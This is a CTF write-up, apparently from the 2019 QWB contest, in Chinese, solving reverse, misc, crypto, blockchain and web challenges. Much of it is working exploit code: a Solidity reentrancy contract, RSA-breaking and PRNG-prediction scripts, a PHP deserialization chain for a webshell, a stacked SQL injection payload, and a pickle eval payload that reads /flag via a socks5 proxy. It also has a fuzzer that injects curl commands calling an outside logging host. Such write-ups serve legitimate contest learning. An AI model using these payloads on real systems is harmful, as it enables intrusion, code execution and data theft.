    pwd += chr(r)

print('\x32\x63\x62\x63\x61' + pwd)
```

`flag{2cbca134bb097e43b292f4431b6cd8db194db}`



### 强网先锋_AD
白给
```python
'ZmxhZ3ttYWZha3VhaWxhaXFpYW5kYW9ifQ=='.decode('base64')
```

`flag{mafakuailaiqiandaob}`




## MISC
### 鲲，坤 or game
题目重点在游戏上，访问`/rom`可以得到`game.db`。查了一下，可以用`GBA`加载游戏。感觉是跳过xx个柱子就会有flag。先进行测试：
![](https://i.imgur.com/aCja6AX.jpg)

这次我一共跳过了6个柱子可以看到内存中的变化。对这几个地址的值尝试修改。最终将`0xc0a2`处改为`0xff`得到flag。
![](https://i.imgur.com/qgSXLUM.png)

### 强网先锋-打野
题目拖下来是一张`bmp`格式图片，常规隐写，没什么说的。直接上图：
![](https://i.imgur.com/Ye56wOj.png)



## CRYPTO
### 强网先锋-辅助
直接把两个n求gcd，即可求出q，而第一个n/q就能得到p，再求一个逆元即可。
```python
from mpz import gcd,invert
q=gcd(n1,n2)
p=n1/q
flag=pow(res,invert(e,(p-1)*(q-1)),n1)
```

### babybank
区块链常见套路题。

首先对公链上的合约进行逆向，发现有如下几个隐藏函数。
- profit: 给一个新用户增加余额，但是要求用户的地址结束为`0xb1b1`。
- guess：完成profit的用户提交一个secret的候选值，正确则余额+1。
- transfer：将余额转到其他用户上，但不可叠加，也就是说不可重复叠加余额。
- withdraw：取款，将balance提现成以太坊，存在可重入漏洞，可实现对余额的下溢，从而有足够的余额买flag。
- payforflag：当有了足够的余额时可以购买flag，但是这个金额无法通过正常的手段达成。

首先从[vanity-eth](https://vanity-eth.tk/)寻找满足要求的地址，依次完成profit，guess函数。

然后建立一个用于利用可重入漏洞的合约，并将余额转至合约地址。

```sol
contract Evil {
    babybank target = babybank(0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c);
    bool public tryed = false;
    string public token = "2909f6d608b0931024c23f7f7a138b97";
    string email = "eXVndW9ydWk5NkBnbWFpbC5jb20=";
    
    constructor() public {
    }
    
    function doSome() public {
        target.withdraw(2);
    }
    
    function() payable public {
        if (!tryed) {
            tryed = true;
            target.withdraw(2);
        }
    }
    
    function askFlag() public {
        target.payforflag(token, email);
    }
}

```

接着需要检查目标合约的以太坊余额，因为在withdraw中需要涉及转账，余额不够会导致利用失败。这里目的合约没有实现`payable`的默认函数，所以会导致转账失败。为此我们需要是实现一个“自杀”合约，以完成转账，代码如下。

```sol
contract Bad {
    constructor() {}
    
    function() payable public {
        
    }
    
    function del() public {
        selfdestruct(0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c);
    }
}

```

### babybet
首先还是先逆向合约，发现如下两个隐藏函数:
- profit: 新用户可直接取得一定数量的余额。
- bet: 打赌，如取得胜利即可获得1000余额，但是只能进行一次。
- 名字未知，函数签名为`0xf0d25268`，作用是给其他用户转账。

首先建立合约通过打赌赢得余额。
```soj
contract bet {
    babybet target = babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);
    address father;
    
    constructor(address fath) public {
        father = fath;
    }
    
    function doSome() public {
        target.profit();
        bytes32 var0 = blockhash(block.number - 1);
        uint var2 = uint(var0) % 3;
        target.bet(var2);
        address(target).call(0xf0d25268, father, 1000);
    }
}
```

但是余额需要的金额是打赌胜利奖金的1000倍，无法通过蛮力完成，再建立一个新的`Father`合约，此合约负责建立新的合约完成赌注。

```soj
contract Father {
    string public token = "2909f6d608b0931024c23f7f7a138b97";
    string email = "eXVndW9ydWk5NkBnbWFpbC5jb20=";
    babybet target = babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);
    
    
    constructor() public {
    }
    
    function askFlag() public {
        target.payforflag(token, email);
    }
    
    function make_son() public {
        uint i = 0;
        for (i = 0; i < 20; i++) {
            bet son = new bet(this);
            son.doSome();
        }
    }

    function() public payable {
    }
}
```
完成后`payforflag`即可。

### copperstudy
考察对sage脚本的使用😂。
```sage
from pwn import *
import hashlib
import struct
from crypto_commons.generic import long_to_bytes
import gmpy2

# context.log_level = 'debug'

io = remote('119.3.245.36', 12345)
io.recvline()
sha_hash = io.recvline().split('=')[1].strip()
print('hash', repr(sha_hash))

head_str = io.recvline().split('=')[1].strip().decode('hex')

def pow():
    for i in range(256):
        print('i: {}/256'.format(i))
        for j in range(256):
            for k in range(256):
                tail_str = struct.pack('ccc', chr(i), chr(j), chr(k))
                full_str = head_str + tail_str
                sha1 = hashlib.sha256()
                sha1.update(full_str)
                temp_hash = sha1.hexdigest()
                if temp_hash == sha_hash:
                    return full_str
pow_ans = pow()
print(pow_ans)
io.sendlineafter("[-]skr.encode('hex')=", pow_ans.encode('hex'))
io.sendlineafter("[+]teamtoken:", "our_token_lol")

io.recvuntil('Generating challenge 1\n')
n = io.recvline().split('=')[1].strip().rstrip('L')
n = int(n, 16)
print('n:', n)

e = int(io.recvline().split('=')[1])
print('e:', e)

print(io.recvline())

c = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)
print('c:', c)

half_m = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
print('half_m:', half_m)

def stereotyped(f, N):
    P.<x> = PolynomialRing(Zmod(N))
    beta = 1
    dd = f.degree()   # Degree of the polynomial
    epsilon = beta/7
    XX = ceil(N**((beta**2/dd) - epsilon))
    rt = f.small_roots(XX, beta, epsilon)
    return rt

ZmodN = Zmod(n)
P.<x> = PolynomialRing(ZmodN)
f = (half_m+x)^e - c
m = half_m + stereotyped(f, n)[0]
m_bytes = long_to_bytes(m)

io.sendlineafter("long_to_bytes(m).encode('hex')=", m_bytes.encode('hex'))

io.recvuntil('Generating challenge 2\n')

n = io.recvline().split('=')[1].strip().rstrip('L')
n = int(n, 16)
print('n:', n)

e = int(io.recvline().split('=')[1])
print('e:', e)

print(io.recvline())

c = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)
print('c:', c)


half_p = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
print('half_p:', half_p)

def N_factorize(f, N):
    P.<x> = PolynomialRing(Zmod(N))
    beta = 0.5
    dd = f.degree()    # Degree of the polynomial
    epsilon = beta/7
    XX = ceil(N**((beta**2/dd) - epsilon))
    rt = f.small_roots(XX, beta, epsilon)
    return rt

P.<x> = PolynomialRing(Zmod(n))
f = x + half_p
p = half_p + N_factorize(f, n)[0]

q = int(n) / int(p)
print('p = {}, q = {}'.format(p, q))

phi = (p - 1)*(q - 1)

d = inverse_mod(e, phi)

print('d: {}'.format(d.hex()))

m = power_mod(c, d, n)
print('m = {}'.format(m))
m_bytes = long_to_bytes(m)

io.sendlineafter("[-]long_to_bytes(m).encode('hex')=", m_bytes.encode('hex'))


io.recvuntil('Generating challenge 3\n')

n = io.recvline().split('=')[1].strip().rstrip('L')
n = int(n, 16)
print('n:', n)

e = int(io.recvline().split('=')[1])
print('e:', e)

print(io.recvline())

c = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)
print('c:', c)

print(io.recvline())

low_d = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
print('low_d:', low_d)

def partial_p(p0, kbits, n):
    PR.<x> = PolynomialRing(Zmod(n))
    nbits = n.nbits()

    f = 2^kbits*x + p0
    f = f.monic()
    roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.3)  # find root < 2^(nbits//2-kbits) with factor >= n^0.3
    if roots:
        x0 = roots[0]
        p = gcd(2^kbits*x0 + p0, n)
        return ZZ(p)

def find_p(d0, kbits, e, n):
    X = var('X')

    for k in xrange(1, e+1):
        results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits)
        for x in results:
            p0 = ZZ(x[0])
            p = partial_p(p0, kbits, n)
            if p:
                return p

beta = 0.5
epsilon = beta^2/7

n = Integer(n)
nbits = n.nbits()
# kbits = floor(nbits*(beta^2+epsilon))
kbits = 512
d0 = low_d & (2^kbits-1)
print "lower %d bits (of %d bits) is given" % (kbits, nbits)

p = find_p(d0, kbits, e, n)
print "found p: %d" % p
q = n//p
d = inverse_mod(e, (p-1)*(q-1))

m = power_mod(c, d, n)

io.sendlineafter("[-]long_to_bytes(m).encode('hex')=", long_to_bytes(m).encode('hex'))


io.recvuntil('Generating challenge 4\n')

e = int(io.recvline().split('=')[1])
print('e:', e)

print(io.recvline())

n1 = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
c1 = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)

n2 = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
c2 = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)

n3 = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
c3 = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)

def CRT(items):
    N = reduce(lambda x, y: x * y, (i[1] for i in items))
    result = 0
    for a, n in items:
        m = N // n
        d, r, s = gmpy2.gcdext(n, m)
        if d != 1: raise Exception("Input not pairwise co-prime")
        result += a * s * m
    return result % N, N
x, n = CRT(([c1, n1], [c2, n2], [c3, n3]))

m = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()
io.sendlineafter("[-]long_to_bytes(m).encode('hex')=", long_to_bytes(m).encode('hex'))


io.recvuntil('Generating challenge 5\n')

n = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
e = int(io.recvline().split('=')[1])
print(io.recvline())
c1 = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)
c2 = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)

def related_message_attack(c1, c2, diff, e, n):
    PRx.<x> = PolynomialRing(Zmod(n))
    g1 = x^e - c1
    g2 = (x+diff)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()

    return -gcd(g1, g2)[0]

m1 = related_message_attack(c1, c2, 1, e, n)
io.sendlineafter("[-]long_to_bytes(m).encode('hex')=", long_to_bytes(m1).encode('hex'))


io.recvuntil('Generating challenge 6\n')

n = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
print(io.recvline())
print(io.recvline())
e = int(io.recvline().split('=')[1].strip().rstrip('L'), 16)
print(io.recvline())

c = int(io.recvline().split('=')[2].strip().rstrip('L'), 16)

import boneh_durfee

delta = 0.28
m = 4
t = int((1-2*delta) * m)  # optimization from Herrmann and May
X = 2*floor(n^delta)  # this _might_ be too much
Y = floor(n^(1/2))    # correct if p, q are ~ same size
P.<x,y> = PolynomialRing(ZZ)
A = int((n+1)/2)
pol = 1 + x * (A + y)

solx, soly = boneh_durfee.boneh_durfee(pol, e, m, t, X, Y)
if solx > 0:
    print "=== solution found ==="
    if False:
        print "x:", solx
        print "y:", soly

    d = int(pol(solx, soly) / e)
    print "private key found:", d
else:
    print "=== no solution was found ==="

m = power_mod(c, d, n)
io.sendlineafter("[-]long_to_bytes(m).encode('hex')=", long_to_bytes(m).encode('hex'))

io.interactive()
```

### randomstudy
第一个随机数生成算法在时间同步的情况下，即可bypass。
第二个随机数生成算法采用的是Java中的线性随机数生成算法，在已有两个数的情况下，即可计算出线性关系。稍微需要注意的是随机数生成后模了一个数，在计算线性关系时需先还原。
第三个`random.getrandbits`在已知624个已生成的数字时就可以计算出内部状态。

```python
from __future__ import print_function
from pwn import *
import hashlib
import struct
import time
import random
import subprocess
from ctypes import c_int32
from randcrack import RandCrack

# context.log_level = 'debug'

io = remote('119.3.245.36', 23456)
io.recvline()
sha_hash = io.recvline().split('=')[1].strip()
print('hash', repr(sha_hash))

head_str = io.recvline().split('=')[1].strip().decode('hex')

def pow():
    for i in range(256):
        print('i: {}/256'.format(i))
        for j in range(256):
            for k in range(256):
                tail_str = struct.pack('ccc', chr(i), chr(j), chr(k))
                full_str = head_str + tail_str
                sha1 = hashlib.sha256()
                sha1.update(full_str)
                temp_hash = sha1.hexdigest()
                if temp_hash == sha_hash:
                    return full_str
pow_ans = pow()
print(pow_ans)
io.sendlineafter("[-]skr.encode('hex')=", pow_ans.encode('hex'))
io.sendlineafter("[+]teamtoken:", "our_token_lol")

io.recvuntil('Generating challenge 1\n')

print("Challenge 1")
random.seed(int(time.time()))
rand_it = random.randint(0,2**64)
io.sendlineafter('[-]', str(rand_it))


print("Challenge 2")
io.recvuntil('Generating challenge 2\n')
v1 = c_int32(int(io.recvline().split(']')[1])).value
if v1 < 0:
    v1 += 1
v2 = c_int32(int(io.recvline().split(']')[1])).value
if v2 < 0:
    v2 += 1

o = subprocess.check_output('foresee java nextInt -o {} {} -c 1'.format(v1, v2).split())
v3 = int(o.strip())

print('v=', v1, v2, v3)
io.sendlineafter('[-]', str(v3))

print("Challenge 3")
io.recvuntil('Generating challenge 3\n')

def read_randbits():
    io.sendlineafter('[-]', '0')
    return int(io.recvline().split(':')[1])

rc = RandCrack()
for i in xrange(624):
    t = read_randbits()
    print(t)
    rc.submit(t)

target = rc.predict_getrandbits(32)
io.sendlineafter('[-]', str(target))


io.interactive()
```

## WEB

### UPLOAD

扫到

> http://49.4.26.104:31709/www.tar.gz

反序列化

```php=
<?php
namespace app\web\controller{
   class Profile
   {
       public $checker;
       public $filename_tmp;
       public $filename;
       public $upload_menu;
       public $ext;
       public $img;
       public $except;
  
       public function __construct()
       {
           $this->checker = 0;
           $this->ext = 1;
           $this->except["index"] = "upload_img";
           $this->upload_menu = "f1sh233";
           $this->img = "";
           $this->filename_tmp = "upload/f2c0a02c43171da197bb1168a55ce619/b8987a6b91f51f7e272c3f86b9e24add.png";
           $this->filename = "upload/233233.php";
       }

       public function upload_img(){
           echo 233;
       }
  
       public function __get($name)
       {
           return $this->except[$name];
       }
 
       public function __call($name, $arguments)
       {
           if($this->{$name}){
               $this->{$this->{$name}}($arguments);
           }
       }
  
   }
   class Register
   {
       public $checker;
       public $registed;

       public function __construct($a)
       {
           $this->registed=0;
           $this->checker=$a;
       }

       public function __destruct()
       {
           if(!$this->registed){
               $this->checker->index();
           }
       }
   }
}

namespace{
   $a = new app\web\controller\Profile;
   $b = new app\web\controller\Register($a);
   $c = ["ID"=>1, "test"=>[$b]];
   var_dump($c);
   echo serialize($c);
   echo "\n";
   echo base64_encode(serialize($c));
   echo "\n";
}
```

生成payload，更改cookie，getshell：

![](https://i.loli.net/2019/05/27/5ceab8a7f23c224533.png)
### 随便注
过滤了union select，没办法跨表，但是可以堆叠查询，那么猜测是用mysqli_multi_query()函数进行sql语句查询的，也就可以使用set @sql = concat(‘create table ‘,newT,’ like ‘,old);
prepare s1 from @sql;
execute s1;
预处理
最后由于表名是数字表名所以要加上反引号
payload
```
1';set%0a@s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(102),CHAR(108),CHAR(97),CHAR(103),CHAR(32),CHAR(102),CHAR(114),CHAR(111),CHAR(109),CHAR(32),CHAR(96),CHAR(49),CHAR(57),CHAR(49),CHAR(57),CHAR(56),CHAR(49),CHAR(48),CHAR(57),CHAR(51),CHAR(49),CHAR(49),CHAR(49),CHAR(52),CHAR(53),CHAR(49),CHAR(52),CHAR(96),CHAR(59));PREPARE%0as2%0aFROM%0a@s;EXECUTE%0as2;--+
```
### 高明的黑客

fuzz 所有 GET/POST 参数

```python=
import requests
import re
import os

files = os.listdir('/Users/f1sh/Downloads/qwb/web2/src/')
re1 = r"\$_POST\['(.*?)'\]"
re2 = r"\$_GET\['(.*?)'\]"
post = []
get = []

for file in files:
   with open('/Users/f1sh/Downloads/qwb/web2/src/'+file,'r') as f:
       text = f.read().strip()
   pattern1 = re.compile(re1)
   pattern2 = re.compile(re2)
   post =  pattern1.findall(text)
   get = pattern2.findall(text)
   for i in post:
       data = {i.strip():'phpinfo();'}
       a = requests.post('http://127.0.0.1/'+file,data=data)
       if 'PHP Version' in a.content:
           print 'ok'+i
           exit()
       data = {i.strip():'curl http://xss.f1sh.site/?{}.{}.wz5v5x.ceye.io'.format(file.encode('hex'), i.encode('hex'))}
       a = requests.post('http://127.0.0.1/'+file,data=data)
   for i in get:
       a = requests.get('http://127.0.0.1/'+file+'?'+i.strip()+'=phpinfo();')
       if 'PHP Version' in a.content:
           print 'ok'+i  
           exit()
       data = {i.strip():'curl http://xss.f1sh.site/?{}.{}.wz5v5x.ceye.io'.format(file.encode('hex'), i.encode('hex'))}
       a = requests.get('http://127.0.0.1/'+file,params=data)
```

![](https://i.loli.net/2019/05/27/5ceab9accbb9613764.png)

![](https://i.loli.net/2019/05/27/5ceab9de7247419404.png)

### babywebbb

扫端口扫到可以匿名访问的 rsync ，获得源码

```
rsync -avz 49.4.71.212::src/backup_old.zip ./
```

注入登录 + gopher 攻击 uwsgi

![](https://i.loli.net/2019/05/27/5ceabaaf5011425267.png)

![](https://i.loli.net/2019/05/27/5ceabac0992ae46850.png)

内网172.16.17.4:1080有 socks5 代理，使用它可以访问到内网192.168.223.222的 web 服务，其使用了文件 session ，使用 save errorlog 覆盖 session 文件来控制内容， pickle 反序列化把 flag 写进 session 中的用户名，然后在 information 可以看到 flag

```python=
import requests
import os
import pickle

def add(url, cookie, proxy, payload):
   url += "/adduser"
   data = {
       "username": payload,
       "password": "123",
       "submit": "submit"
   }
   requests.post(url, data = data, cookies = cookie, proxies = proxy)

def save(url, cookie, porxy):
   url += "/savelog"
   data = {
       "filepath": 'session\\\\9d2b8697-ae09-4df4-b035-27e16c4f83ee',
       "submit": 'Save'
   }
   requests.post(url, data = data, cookies = cookie, proxies = proxy)

def exp(url, proxy):
   url += "/information"
   cookie = {
       "QWB_SESSION": "9d2b8697-ae09-4df4-b035-27e16c4f83ee.DPeuP5ykMup19ulT02B5L_1LAj8"
   }
   requests.get(url, cookies = cookie, proxies = proxy)

class A(object):
   def __reduce__(self):
       #a = "open('/Users/f1sh/Downloads/qwb/web4/696611eb-41f8-4145-967d-d4c5e93c5936','wb').write(\n\tbytes('(dp0\\nS\\'username\\'\\np1\\nS\\'' + (open('/flag','r').read().strip()) + '\\'\\np2\\ns.', 'utf-8')\n)\n"
       a = "open('/home/qwb/session/dc8af170-67fb-4019-9a50-4ca21dc789d6','wb').write(\n\tbytes('(dp0\\nS\\'username\\'\\np1\\nS\\'' + (open('/flag','r').read().strip()) + '\\'\\np2\\ns.', 'utf-8')\n)\n"
       return (eval,(a,))  
 
b = A()
result = pickle.dumps(b)
url = "http://192.168.223.222"
cookie = {
   "QWB_SESSION": "696611eb-41f8-4145-967d-d4c5e93c5936.vbD5yLe1pB-RCCefb5SSlOz78Bc"
}
proxy = {
   "http": "socks5://139.199.27.197:6001",
   "https": "socks5://139.199.27.197:6001"
}
for i in xrange(10):
   add(url, cookie, proxy, result)
   save(url, cookie, proxy)
   exp(url, proxy)
```

![](https://i.loli.net/2019/05/27/5ceabb5958cb799081.png)

### 强网先锋-上单

thinkphp rce:

![](https://i.loli.net/2019/05/27/5ceabb83463d723676.png)